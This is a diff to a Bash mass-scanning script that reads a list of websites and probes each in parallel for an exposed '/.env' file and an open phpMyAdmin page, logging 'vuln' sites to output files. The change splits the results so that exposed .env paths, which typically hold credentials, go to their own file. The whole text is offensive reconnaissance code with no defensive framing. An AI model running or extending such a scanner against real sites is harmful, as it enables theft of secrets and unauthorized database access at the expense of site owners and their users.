@@ -27,8 +27,11 @@ OPTIONS () {
 printf "${red}[>]${white} List                        :${lightgreen} "
 read list
 
-printf "${red}[>]${white} Save As                     :${lightgreen} "
+printf "${red}[>]${white} Save phpMyAdmin             :${lightgreen} "
 read save
+
+printf "${red}[>]${white} Save /.env                  :${lightgreen} "
+read sv
 
 site=$(cat $list)
 }
@@ -39,7 +42,7 @@ do
 ((cthread=cthread%LIMITATOR)); ((cthread++==0)) && wait
 if [[ $(curl --connect-timeout 0 --max-time 3 -kLs "${site}/.env" ) =~ "USERNAME" ]]; then
   printf "${white}[+] ${site} is ${lightgreen} vuln\n"
-  echo "$site/.env" >> ${save}
+  echo "$site/.env" >> ${sv}
 
 elif [[ $(curl --connect-timeout 0 --max-time 3 -kLs "${site}/phpMyAdmin/" ) =~ "pma_username" ]]; then
   printf "${white}[+] ${site} is ${lightgreen} vuln\n"
